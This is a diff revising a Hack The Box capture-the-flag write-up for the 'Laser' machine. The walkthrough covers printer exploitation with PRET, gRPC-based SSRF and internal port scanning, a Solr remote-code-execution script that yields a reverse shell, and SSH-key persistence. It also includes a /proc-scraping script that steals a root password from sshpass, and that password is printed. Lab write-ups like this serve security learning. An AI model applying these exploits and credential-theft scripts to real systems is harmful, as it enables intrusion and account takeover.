@@ -6,18 +6,18 @@ points: 50
 rating: 4.1
 date: 2020-08-08
 avatar: assets/htb/laser.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Laser
 ---
+
 ## Overview
 
-This Insane-difficulty machine from [Hack The Box](https://www.linkedin.com/company/hackthebox/) took me a lot longer to progress to the initial foothold than most boxes take to root!  This machine had some very interesting avenues of approach that greatly differed from the standard enumeration and progression that most of the lower difficulty machines require. I had to research new protocols just to begin, and by the end had to write five python scripts to progress through the initial foothold and for later privilege escalation.  All in all it was a fun, but very challenging ride!
+Reaching the foothold on this Insane box from [Hack The Box](https://www.linkedin.com/company/hackthebox/) took me longer than rooting most other machines! The attack paths here were unusual and a far cry from the typical enumerate-and-pivot flow that lower-difficulty boxes rely on. Just getting started meant learning protocols I hadn't touched before, and by the end I'd written five python scripts to drive the foothold and the later privilege escalation. Overall a fun but genuinely tough run!
 
 ## Useful Skills and Tools
 
 #### Using socat to redirect traffic to a port
 
-* The command below will redirect traffic intended for the local machine's port 22 and send it to port 22 on the machine at IP 172.17.0.1.  
+* The command below forwards anything arriving on the local machine's port 22 over to port 22 on the host at 172.17.0.1.  
 
   ```text
   socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
@@ -27,7 +27,7 @@ This Insane-difficulty machine from [Hack The Box](https://www.linkedin.com/comp
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked off enumeration with an nmap scan against `<YOUR_IP>`. The flags I lean on are: `-p-`, a shorthand telling nmap to hit every port; `-sC`, which is the same as `--script=default` and fires nmap's default enumeration scripts at the target; `-sV` for a service scan; and `-oA <name>` to write the results out under the filename `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
@@ -117,13 +117,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 44.32 seconds
 ```
 
-The Nmap scan only showed three open ports: 22 - SSH, 9000, and 9001. I wasn't familiar with them so I searched for what uses ports 9000 and 9001.  It turns out these are commonly used by printers.
+The Nmap scan returned just three open ports: 22 - SSH, 9000, and 9001. Not recognizing the latter two, I looked up what typically uses ports 9000 and 9001, and learned they're often associated with printers.
 
 ### Port 9000 & 9001
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-9000.png)
+![](assets/wu/laser/img-1.png)
 
-First I tried firing up a browser to see what kind of reply I might get from these ports.  9001 did not respond at all, while 9000 just sent back garbage characters \(probably binary information\).
+My first move was to point a browser at these ports to see how they'd answer. 9001 gave nothing back at all, and 9000 returned only garbage characters \(likely binary data\).
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
@@ -142,13 +142,13 @@ telnet> quit
 Connection closed.
 ```
 
-Next, I connected with telnet but everything I sent just got back the reply `?`.  I did some further research to see what kind of vulnerabilities might be exposed by having these two ports open.  There was plenty of information on how to exploit open printers.
+Then I connected via telnet, but whatever I typed only came back as `?`.  I dug deeper into what vulnerabilities these two open ports might expose, and found plenty of material on attacking exposed printers.
 
 * [http://www.irongeek.com/i.php?page=security/networkprinterhacking](http://www.irongeek.com/i.php?page=security/networkprinterhacking)
 * [https://book.hacktricks.xyz/pentesting/9100-pjl](https://book.hacktricks.xyz/pentesting/9100-pjl)
 * [http://hacking-printers.net/wiki/](http://hacking-printers.net/wiki/)
 
-One of the sources pointed out that if you can access a printer and also SNMP, then the system is pretty much yours already.
+One reference noted that having access to both a printer and SNMP basically means the system is already yours.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
@@ -164,11 +164,11 @@ PORT    STATE  SERVICE REASON
 Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
 ```
 
-Unfortunately, it seemed as if SNMP was not enabled on this machine \(or was using a non-standard port?\) as this would have given a good path forward.
+Sadly SNMP appeared to be disabled here \(or perhaps moved to a non-standard port?\), which would otherwise have offered a solid way in.
 
 ### Printer Exploitation Toolkit \(PRET\)
 
-After searching a bit more I came across a nice toolkit someone had put together for exploiting printers called the Printer Exploitation Toolkit \(PRET\).  
+A little more searching turned up a handy toolkit built for attacking printers, the Printer Exploitation Toolkit \(PRET\).  
 
 [https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET)
 
@@ -230,7 +230,7 @@ cat    debug   discover  exit  get   info  loop  open   put       site
 close  delete  edit      free  help  load  ls    print  selftest  timeout
 ```
 
-Following the instructions, I was able to quickly get it up and running, and got a pret shell on the machine using the PS printer language. This only gave errors, so I switched to the PCL language and tried again.  This time I was able to use the `help` command to get a list of further options to try.
+Following the docs, I got it running quickly and landed a pret shell on the machine using the PS printer language. That only produced errors, so I swapped to the PCL language and retried.  This time the `help` command listed more options to explore.
 
 ```text
 <YOUR_IP>:/> ls
@@ -242,11 +242,11 @@ Connection to <YOUR_IP> established
 This is a virtual pclfs. Use 'put' to upload files.
 ```
 
-Trying the `ls` command gave me an error message that said I could use `put` to upload files.  None of the other commands gave anything further.
+Running `ls` returned an error telling me I could use `put` to upload files.  The remaining commands yielded nothing more.
 
 > Due to its limited capabilities, PCL is hard to exploit from a security perspective unless one discovers interesting proprietary commands in some printer manufacturers's PCL flavour. The PRET tool implements a virtual, PCL-based file system which uses macros to save file content and metadata in the printer's memory. This hack shows that even a device which supports only minimalist page description languages like PCL can be used to store arbitrary files like copyright infringing material. Although turning a printer into a file sharing service is not a security vulnerability per se, it may apply as ‘misuse of service’ depending on the corporate policy.
 
-After reading up about the difference between the printer languages I decided that this one probably didn't speak the binary language of vaporators...I mean PCL.
+After reading up on the differences between the printer languages, I concluded this target probably didn't speak the binary language of vaporators...I mean PCL.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser/PRET]
@@ -282,7 +282,7 @@ debug   display   format  id    mirror  print      selftest  traversal
 <YOUR_IP>:/>
 ```
 
-After testing all of the PCL commands and getting nothing I went back and tried the third language, PJL, and got another shell with many more commands available after using the `help` command.
+Having exhausted the PCL commands with no results, I circled back and tried the third language, PJL, which gave me another shell whose `help` command exposed far more commands.
 
 ```text
 <YOUR_IP>:/> ls
@@ -301,18 +301,16 @@ b'VfgBAAAAAADOiDS0d+nn3sdU24Myj/njDqp6+zamr0JMcj84pLvGcvxF5IEZAbjjAH
 dgblOUDj6BOA+MLrAiC/chpVOipOMtlonY1lxELrGFvQKAO8RSMUZNovS5gkLUolUkX3X6OeCsYJRf20mrgSSQ'
 ```
 
-This time I was able to navigate the file structure.  In the folder `/pjl/jobs` there was a file named `queued`. 
+This time I could browse the file structure.  Inside `/pjl/jobs` sat a file called `queued`. 
 
-{% hint style="info" %}
-I made the mistake of **`cat`**-ing the **`queued`** file at first. Don't do this, unless you want to copy the extremely long base64 string and recreate the file yourself. Use **`get`** instead...
-{% endhint %}
+My first mistake was **`cat`**-ing the **`queued`** file. Avoid that unless you enjoy copying an enormous base64 string and rebuilding the file by hand. Use **`get`** instead...
 
 ```text
 <YOUR_IP>:/pjl/jobs> get queued
 172199 bytes received.
 ```
 
-**Use `get`**.  This will nicely download the file to your local machine.  However, when I opened the file it was still a wall of base64 encoded text so I tried to decode it.
+**Use `get`**.  It downloads the file cleanly to your local box.  When I opened it, though, it was still a wall of base64 text, so I attempted to decode it.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser/PRET]
@@ -320,7 +318,7 @@ I made the mistake of **`cat`**-ing the **`queued`** file at first. Don't do thi
 base64: invalid input
 ```
 
-After removing the extra characters \(that looked to indicate that it was supposed to be a python byte string\) from the file I tried to base64 decode it, but it still seemed to be invalid encoding.  I decided to keep enumerating to see if I could find anything to help me move forward.
+After stripping the extra characters \(which seemed to mark it as a python byte string\) out of the file, I tried base64-decoding it again, but the encoding still looked invalid.  So I kept enumerating in hopes of finding something to push me forward.
 
 ```text
 <YOUR_IP>:/pjl/jobs> df
@@ -328,7 +326,7 @@ VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
 0:     1755136    1718272    <HT>     <HT>  READ-WRITE
 ```
 
-I did seem to have read-write access on the local drive.  I wondered if there was a way to write something malicious to the printer to execute code...
+It looked like I had read-write access to the local drive.  I started wondering whether I could write something malicious to the printer to run code...
 
 ```text
 <YOUR_IP>:/pjl/jobs> id
@@ -388,7 +386,7 @@ Message: test
 Setting printer's display message to "test"
 ```
 
-Most of the commands gave nothing useful back.
+Most of the commands returned nothing of value.
 
 ```text
 <YOUR_IP>:/> env
@@ -501,7 +499,7 @@ LPARM:POSTSCRIPT PRTPSERRS=OFF [2 ENUMERATED]
 LPARM:ENCRYPTION MODE=AES [CBC]
 ```
 
-The command `env` showed me the values of the printer's environment variables.  The line `LPARM:ENCRYPTION MODE=AES [CBC]` looked like it might be useful if I encountered encrypted passwords or such.
+The `env` command revealed the printer's environment variable values.  The line `LPARM:ENCRYPTION MODE=AES [CBC]` seemed like it could matter if I ran into encrypted passwords or similar.
 
 ```text
 <YOUR_IP>:/> info
@@ -604,7 +602,7 @@ TIMED=0 [2 RANGE]
         300
 ```
 
-The `info` command seemed to give pretty much the same information as some of the other commands...meaning nothing useful.
+The `info` command mostly echoed what the other commands already showed...so, nothing useful.
 
 ```text
 <YOUR_IP>:/> mirror
@@ -615,7 +613,7 @@ Traversing pjl/jobs/
 172199 bytes received.
 ```
 
-The `mirror` command seemed to be pretty interesting, as it created a mirror of the print queue on my local machine.  However, no one seemed to be sending new jobs to the printer.
+The `mirror` command was interesting, copying the print queue down to my local machine.  Still, nobody appeared to be submitting new jobs to the printer.
 
 ### Decoding the `queued` file
 
@@ -630,11 +628,11 @@ Writing copy to nvram/<YOUR_IP>
 ..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................k...e....y.....13u94r6..643rv19u
 ```
 
-The `nvram` command had a dump operation which gave me what looked to be a possible encryption key. 
+The `nvram` command included a dump operation that handed me what appeared to be a possible encryption key. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-nvram-key-capture.png)
+![](assets/wu/laser/img-2.png)
 
-I wasn't sure that the output was showing everything I needed so I started Wireshark and did a packet capture to see what other data was being dumped.
+Unsure whether the output contained everything I needed, I fired up Wireshark and captured packets to see what other data was being dumped.
 
 ```text
 DATA = 49
@@ -657,11 +655,11 @@ DATA = 57
 DATA = 117
 ```
 
-I got the above data points back from the capture.  They looked like decimal encoded characters to me.
+The capture gave me the data points above, which looked to me like decimal-encoded characters.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-nvram-key-capture-decode.png)
+![](assets/wu/laser/img-3.png)
 
-The key was decimal encoded, so I used CyberChef to decode it and got the key `13vu94r6643rv19u`. For some reason the console output didn't decode it properly from the `nvram` command. \(I'm also not sure what the `46` characters were in the middle of the two halves, but they weren't needed. Some sort of delimiter for the two halves?\)
+Since the key was decimal-encoded, I ran it through CyberChef and recovered the key `13vu94r6643rv19u`. The console output from the `nvram` command somehow hadn't decoded it correctly. \(I'm also not certain what the `46` characters between the two halves were, but they weren't needed. Maybe a delimiter separating the two halves?\)
 
 ```text
 <YOUR_IP>:/> selftest
@@ -677,7 +675,7 @@ Not available.
 ?
 ```
 
-After going through pretty much all of the commands and finding very little useful information, I went back to the `queued` file I had downloaded. Since I now had a potential encryption key and had noted the encryption method was AES... which outputs base64 encoded material that wont decode properly...I figured I was on to something.  I did some research to make sure I had all the information I needed to decode the file if it were AES-CBC encrypted.
+Having run through nearly every command and turned up little of use, I returned to the `queued` file I'd downloaded. Now that I held a candidate encryption key and had spotted that the encryption was AES... which produces base64 material that won't decode cleanly...I figured I was onto something.  I researched what I'd need to decode the file assuming it was AES-CBC encrypted.
 
 * [https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode](https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode)
 * [https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256](https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256)
@@ -705,7 +703,7 @@ with open("queued.stripped","r") as q64:
         out.write(pt)
 ```
 
-I wrote a simple python script to decode the `queued` file after I stripped out the extraneous characters, and wrote it out to a file `q-out`.  It took a few tries to do since there was no IV.  I read that sometimes the IV is simply the last 16 byte section of the file, which worked to decode the file.  Since the file was an odd number of byte-chunks, I had to strip off the beginning extra bytes to get it to decode.
+I wrote a small python script to decode the `queued` file after stripping the extraneous characters, dumping the result to `q-out`.  It took a few attempts since there was no IV.  I'd read that the IV is sometimes just the final 16-byte chunk of the file, and that approach decoded it.  Because the file held an odd number of byte-chunks, I had to drop the extra bytes at the start to make it decode.
 
 ### The PDF document
 
@@ -715,9 +713,9 @@ I wrote a simple python script to decode the `queued` file after I stripped out 
 q-out: PDF document, version 1.4
 ```
 
-The file that was in the print queue turned out to be a PDF document.
+The file from the print queue turned out to be a PDF document.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-q-ou1.png)
+![](assets/wu/laser/img-4.png)
 
 ```text
 Description
@@ -773,11 +771,11 @@ Bugs
 4. Merge staging core to feed engine
 ```
 
-The PDF File contained instructions for interacting with a print API using gRPC on port 9000. It also contained the hostname `printer.laserinternal.htb` which I added to my `/etc/hosts` file. 
+The PDF described how to talk to a print API over gRPC on port 9000. It also listed the hostname `printer.laserinternal.htb`, which I added to my `/etc/hosts` file. 
 
 ### The GRPC python client
 
-Now that I knew what protocol to use to communicate with the server, I needed to figure out how it worked, and how to use this to enumerate the server more.
+With the protocol for talking to the server now known, I had to work out how it functioned and how to leverage it for further enumeration.
 
 * [https://grpc.io/docs/languages/python/basics/](https://grpc.io/docs/languages/python/basics/)
 * [https://grpc.io/docs/what-is-grpc/introduction/](https://grpc.io/docs/what-is-grpc/introduction/)
@@ -793,7 +791,7 @@ service FooService {
 
 > The first line of the file specifies that you're using proto3 syntax: if you don't do this the protocol buffer compiler will assume you are using proto2. This must be the first non-empty, non-comment line of the file.
 
-In the documentation for grpc and protocol buffers there were examples of how to communicate with this type of service using Python.
+The grpc and protocol buffers documentation included examples of communicating with this kind of service from Python.
 
 * [https://developers.google.com/protocol-buffers/docs/pythontutorial](https://developers.google.com/protocol-buffers/docs/pythontutorial) 
 * [https://grpc.io/docs/languages/python/quickstart/](https://grpc.io/docs/languages/python/quickstart/)
@@ -820,14 +818,14 @@ string feed = 1;
 }
 ```
 
-Using this information, and the information from the PDF document I recovered, I created the above `.proto` file to tell the grpc client how to communicate with this particular service.
+Combining that with the details from the PDF I'd recovered, I built the `.proto` file above to instruct the grpc client on how to speak to this specific service.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
 └─$python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. laser.proto
 ```
 
-Next I ran the command from the documentation for making the python libraries that would enable communication with the server. This created two files: `laser_pb2_grpc.py` and `laser_pb2.py`.
+Next I ran the documented command to generate the python libraries needed to communicate with the server. This produced two files: `laser_pb2_grpc.py` and `laser_pb2.py`.
 
 ```python
 import laser_pb2_grpc
@@ -848,7 +846,7 @@ def test():
 test()
 ```
 
-I then created a python client `grpc_client.py` to connect to port 9000 on the server and send my request. I set the feed URL to be my machine to test the connection.  Next I created a netcat listener to catch the return message.
+I then wrote a python client `grpc_client.py` to connect to port 9000 on the server and send my request. I pointed the feed URL at my own machine to test the connection.  Then I set up a netcat listener to catch the reply.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
@@ -861,14 +859,14 @@ User-Agent: FeedBot v1.0
 Accept: */*
 ```
 
-I got a connection back to my netcat listener, but I wasn't sure what to do with it at that point. However, since I was able to entice the server to send me connections with information I controlled I figured I could try to do a Server Side Request Forgery \(SSRF\) attack and maybe get it to pull a malicious file from my system.
+A connection came back to my netcat listener, though I wasn't sure what to do with it yet. Still, since I could coax the server into connecting to me using data I controlled, I reasoned I could attempt a Server Side Request Forgery \(SSRF\) attack and perhaps make it fetch a malicious file from my system.
 
 ```text
 On successful data transmission you should see a message....
 return service_pb2.Data(feed='Pushing feeds')
 ```
 
-The PDF mentioned that I should get back the message `'Pushing feeds'`, but I did not get any messages back at all.  
+The PDF said I should receive the message `'Pushing feeds'`, yet I got no messages back at all.  
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
@@ -889,7 +887,7 @@ grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
 >
 ```
 
-While doing some testing I forgot to start my listener, and got the above error message back since my computer refused the connection.  The verbose error message came in handy later.
+During some testing I forgot to start my listener and got the error above, since my machine refused the connection.  That verbose error proved useful later on.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
@@ -897,7 +895,7 @@ While doing some testing I forgot to start my listener, and got the above error 
 Exception calling application: (6, 'Could not resolve host: printer.laserinternal.htb')
 ```
 
-After redirecting the target to be the internal machine I got an error message with a new hostname.  I added this to my `/etc/hosts` file.  Sending the traffic to this hostname did not resolve my connection errors.
+Once I redirected the target to the internal machine, the error message revealed a new hostname.  I appended it to my `/etc/hosts` file.  Directing traffic to that hostname still didn't fix my connection errors.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
@@ -911,11 +909,11 @@ PING printer.laserinternal.htb (<YOUR_IP>) 56(84) bytes of data.
 rtt min/avg/max/mdev = 40.902/41.234/41.566/0.332 ms
 ```
 
-I was able to ping the machine using that hostname, so my connectivity wasn't the problem.
+I could ping the machine via that hostname, so connectivity wasn't the issue.
 
 ### Python port scanner - internal machine
 
-I decided that there may possibly be an internal port open that I couldn't reach, therefore the errors. I needed some way of enumerating the inside.  Since I knew that a closed port gave a "Connection refused error" I was able to use this to filter responses.
+I figured the errors might stem from an internal port I couldn't reach, so I needed a way to enumerate from the inside.  Knowing that a closed port produced a "Connection refused error," I could use that to filter responses.
 
 * [https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python](https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python) 
 * [https://www.geeksforgeeks.org/port-scanner-using-python/](https://www.geeksforgeeks.org/port-scanner-using-python/)
@@ -962,11 +960,9 @@ def scan():
 scan()
 ```
 
-I used the `grpc_client.py` as a base to build the port scanner.  The scanner was very slow as it made a full connection, sent its message, and waited for a reply for every port. I thought about making the script multithreaded, but had to go out so I left it running instead.  
+I based the port scanner on `grpc_client.py`.  It was very slow because every port meant a full connection, a sent message, and a wait for the reply. I considered multithreading the script, but I had to head out so I just left it running.  
 
-{% hint style="info" %}
-I did find a good example of how to do a multi-threaded port scanner at [https://github.com/gh0x0st/python3\_multithreading](https://github.com/gh0x0st/python3_multithreading).  This person's code is also very clean and well structured so thanks to them for that in addition to the great examples!
-{% endhint %}
+I did come across a solid example of a multi-threaded port scanner at [https://github.com/gh0x0st/python3\_multithreading](https://github.com/gh0x0st/python3_multithreading).  Their code is clean and well organized, so thanks to them for both that and the great examples!
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
@@ -987,18 +983,18 @@ Port 9100 open!
 Exception calling application: (1, 'Received HTTP/0.9 when not allowed\n')
 ```
 
-When I got back home I found that there were five ports open, and I noticed that port `8983` responded with the message of `feed: Pushing feeds` that was expected from the PDF.
+When I got home I saw five open ports, and port `8983` answered with the `feed: Pushing feeds` message the PDF had led me to expect.
 
 ### Solr exploitation
 
-A search for port 8983 exploit led me to 
+Searching for a port 8983 exploit pointed me to 
 
 * [https://www.exploit-db.com/exploits/47572](https://www.exploit-db.com/exploits/47572)
 * [https://github.com/veracode-research/solr-injection](https://github.com/veracode-research/solr-injection)
 * [https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability](https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability)
 * [https://github.com/jas502n/solr\_rce](https://github.com/jas502n/solr_rce)
 
-Solr is an open source application from Apache which provides searching and indexing capabilities for large amounts of data.  Using the code from the exploit and my client from earlier I crafted a python script that would connect to the server, change the configuration to enable code execute, then allow for execution of arbitrary commands specified as arguments to the script.  
+Solr is an Apache open source application that delivers search and indexing over large volumes of data.  Combining the exploit code with my earlier client, I built a python script that would connect to the server, alter the configuration to enable code execution, and then run arbitrary commands passed as script arguments.  
 
 ```python
 import laser_pb2
@@ -1051,7 +1047,7 @@ except:
 get_shell()
 ```
 
-After a lot of trial and error, I got my code to work and set up a netcat listener.  I made my payload a simple callback reverse shell and crossed my fingers.
+After plenty of trial and error, I got the code working and set up a netcat listener.  I made the payload a simple callback reverse shell and crossed my fingers.
 
 ## Initial Foothold
 
@@ -1066,13 +1062,13 @@ uid=114(solr) gid=120(solr) groups=120(solr)
 laser
 ```
 
-I got a connection from the machine on my waiting nc listener!  I quickly upgraded my shell and checked what context I was logged in as.  I was a user named `solr`.  
+The machine connected back to my waiting nc listener!  I quickly upgraded the shell and checked what context I had landed in.  I was the user `solr`.  
 
 ```text
 solr@laser:~$ echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNjkkEoBIEUE1qbriniZITFVwyL5zjbjJopB07xl9UAgAjbkTEx/IfL5xvd6cDNUHmW5KEkXTiNJm3sLBFfloVY=' >> .ssh/authorized_keys
 ```
 
-Next, I put my public key in the `solr` user's `.ssh` folder so I could log in with a real shell.
+Next, I dropped my public key into the `solr` user's `.ssh` folder so I could log in with a proper shell.
 
 ```text
 solr@laser:/tmp/cypher/.ssh$ cat /etc/passwd
@@ -1114,7 +1110,7 @@ dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 solr:x:114:120::/var/solr:/bin/bash
 ```
 
-I noticed in `/etc/passwd` that there were only two users who could log in, `solr` and `root`.
+In `/etc/passwd` I noticed only two users could actually log in: `solr` and `root`.
 
 ### User.txt
 
@@ -1130,7 +1126,7 @@ solr@laser:/home/solr$ cat user.txt
 1cc8************************c762
 ```
 
-The file `user.txt` was in `/home/solr` as expected, however I was confused at first since this was not the user's home directory.
+The `user.txt` file sat in `/home/solr` as expected, though it threw me at first since that wasn't actually the user's home directory.
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -1168,7 +1164,7 @@ Last login: Tue Aug  4 07:01:35 2020 from 10.10.14.3
 solr@laser:~$
 ```
 
-After creating an SSH key I was able to log in. Upon login it told me the IP addresses for some interfaces, which I decided to check out, since docker containers often have security vulnerabilities.
+With an SSH key in place I logged in. The login banner showed IP addresses for several interfaces, which I wanted to investigate since docker containers frequently carry security weaknesses.
 
 ```text
 solr@laser:/home/solr$ ip a
@@ -1202,7 +1198,7 @@ solr@laser:/home/solr$ ip a
        valid_lft forever preferred_lft forever
 ```
 
-There seemed to be a docker interface running on `172.17.0.1/16`, and potentially a container that looked to be hosted in the `172.18.0.1/16` range.
+It looked like a docker interface was running on `172.17.0.1/16`, with a container apparently hosted somewhere in the `172.18.0.1/16` range.
 
 ```text
 solr@laser:~$ ps aux > /dev/shm/ps
@@ -1283,7 +1279,7 @@ root     1713720  0.0  0.4  13352  8620 ?        Ss   18:43   0:00 sshd: root
 solr     1713735  0.0  0.1   8876  3352 pts/5    R+   18:43   0:00 ps aux
 ```
 
-I checked for processes running that might give me an indication at what may have been running in the containers, and noticed an interesting process associated with a container hosted at 172.18.0.2.
+I looked through the running processes for clues about what the containers were doing, and spotted an interesting process tied to a container at 172.18.0.2.
 
 ### sshpass
 
@@ -1291,7 +1287,7 @@ I checked for processes running that might give me an indication at what may hav
 sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /opt/updates/files/jenkins-feed root@172.18.0.2:/root/feeds/
 ```
 
-Here, the sshpass program is being used to pass `root`'s password to SCP in order to move the file `jenkins-feed` to a folder on the docker container.  I opened the man page for sshpass to see if I could learn any more about how it worked and what it was doing.
+Here sshpass is feeding `root`'s password to SCP so it can copy the `jenkins-feed` file into a folder on the docker container.  I pulled up the sshpass man page to understand more about how it works and what it does.
 
 > sshpass is a utility designed for running ssh using the mode referred to as "keyboard-interactive" password authentication, but in non-interactive mode.
 >
@@ -1310,11 +1306,11 @@ Here, the sshpass program is being used to pass `root`'s password to SCP in orde
 >
 >   The  -p  option should be considered the least secure of all of sshpass's options.  **All system users can see the password in the command line with a simple "ps"  command.  Sshpass  makes  a minimal  attempt  to hide the password, but such attempts are doomed to create race conditions without actually solving the problem.** Users of sshpass are encouraged to use one of the  other password passing techniques, which are all more secure.
 
-Essentially it seemed as if this program was written to bypass the security of SSH's "user presence" check when passing plaintext passwords.  From the man page for `sshpass` I found information that points out that there is a vulnerability in the implementation of the `-p` option.  I tried searching on Google for more information about this race condition, but wasn't able to find anything related to exploiting this.  I decided to look around and see if the source code was available to see if I could determine what this race condition was caused by and if I could exploit it.  
+In essence, this program exists to defeat SSH's "user presence" check when supplying plaintext passwords.  The `sshpass` man page itself flags a weakness in how the `-p` option is implemented.  I googled around for details on this race condition but couldn't find anything about exploiting it.  So I went looking for the source code to figure out what causes the race condition and whether I could exploit it.  
 
 I found the code for sshpass on GitHub: [https://github.com/kevinburke/sshpass/blob/master/main.c](https://github.com/kevinburke/sshpass/blob/master/main.c)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-sshpass-code.png)
+![](assets/wu/laser/img-5.png)
 
 ```c
 // Parse the command line. Fill in the "args" global struct with the results. Return argv offset
@@ -1407,7 +1403,7 @@ static int parse_options( int argc, char *argv[] )
 }
 ```
 
-After analyzing the source code, I found out that the `-p` option takes in the original password from argument input and obfuscates it by replacing each character with a 'z', one character at a time. In the `ps aux` output I got earlier I saw the command `sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz` followed by the SCP command the password was being supplied to.  Since the command is originally input with the password in plaintext, the race condition exists where the plaintext password must be able to be read from memory prior to being obfuscated.
+Studying the source, I learned that the `-p` option reads the original password from the argument and then hides it by overwriting each character with a 'z', one at a time. The earlier `ps aux` output showed `sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz` followed by the SCP command that received the password.  Because the password is initially supplied in plaintext, a race condition exists: the plaintext password can potentially be read from memory before it gets obfuscated.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
@@ -1415,7 +1411,7 @@ After analyzing the source code, I found out that the `-p` option takes in the o
 32
 ```
 
-I copied the string of 'z's from the output to check its length.  The password was 32 characters long.  I tried logging in with `passwordpasswordpassword` but no luck...
+I copied the run of 'z's from the output to measure it.  The password was 32 characters long.  I tried logging in with `passwordpasswordpassword`, but no luck...
 
 ### Getting root's password
 
@@ -1437,20 +1433,20 @@ while(1):
             print("")
 ```
 
-I wrote a python script to read the contents of each process in `/procs` and see if they had a `cmdline` file in them. If the file existed then it looked in the data for the word `sshpass`. Then, if it found that command it would check to see if that process also contained multiple 'z' characters, and if not, would print the command line that made that process.
+I wrote a python script to read each process under `/procs` and check whether it had a `cmdline` file. When that file existed, it scanned the data for the word `sshpass`. If found, it then checked whether the process also held multiple 'z' characters, and if not, it printed the command line that spawned the process.
 
 ```text
 solr@laser:/dev/shm$ python3 get_pass.py
 'sshpass\x00-p\x00c413d115b3d87664499624e7826d8c5a\x00scp\x00/opt/updates/files/graphql-feed\x00root@172.18.0.2:/root/feeds/\x00'
 ```
 
-After waiting for quite some time, I got what I wanted. Cleaning up the output made the command:
+After a fairly long wait, I got what I was after. Tidying up the output gave the command:
 
 ```text
 sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/graphql-feed root@172.18.0.2:/root/feeds/
 ```
 
-The password was `c413d115b3d87664499624e7826d8c5a`.
+So the password was `c413d115b3d87664499624e7826d8c5a`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
@@ -1458,7 +1454,7 @@ The password was `c413d115b3d87664499624e7826d8c5a`.
 32
 ```
 
-I verified the length of the password I found to make sure that it matched what I found earlier.
+I checked the length of the recovered password to confirm it matched what I'd seen earlier.
 
 ### Getting a root shell \(on the container\)
 
@@ -1479,14 +1475,14 @@ Last login: Sat Dec 19 13:56:50 2020 from 172.18.0.1
 root@20e3289bc183:~#
 ```
 
-Using this password and SSH I was able to log in as `root` to the docker container. Next I tried a standard docker container privilege escalation method where I mount the root filesytem into the container.
+With that password and SSH I logged into the docker container as `root`. Then I went for a standard docker container privilege escalation technique: mounting the host's root filesystem into the container.
 
 ```text
 solr@laser:~$ which docker
 /usr/bin/docker
 ```
 
-First I verified that the `docker` program was on the host system \(to copy to the container if need be\).
+First I confirmed the `docker` binary was present on the host \(so I could copy it into the container if needed\).
 
 ```text
 solr@laser:~$ scp /usr/bin/docker root@172.18.0.2:/dev/shm/docker
@@ -1495,7 +1491,7 @@ docker                                                                  0%    0 
 docker                                                                100%   81MB 157.6MB/s   00:00
 ```
 
-Next I tried to copied the program to `/dev/shm` folder on the container, but unfortunately there was no space to copy the file.
+Next I tried copying the binary into the container's `/dev/shm` folder, but there wasn't enough space for the file.
 
 ```text
 root@20e3289bc183:~# df
@@ -1510,7 +1506,7 @@ tmpfs            1017608       0   1017608   0% /proc/scsi
 tmpfs            1017608       0   1017608   0% /sys/firmware
 ```
 
-I used the `df` command on the container to verify open space, and noticed it was just running memory space that was full \(`/dev/shm`\).
+Running `df` on the container to check free space, I saw it was only the in-memory space \(`/dev/shm`\) that was full.
 
 ```text
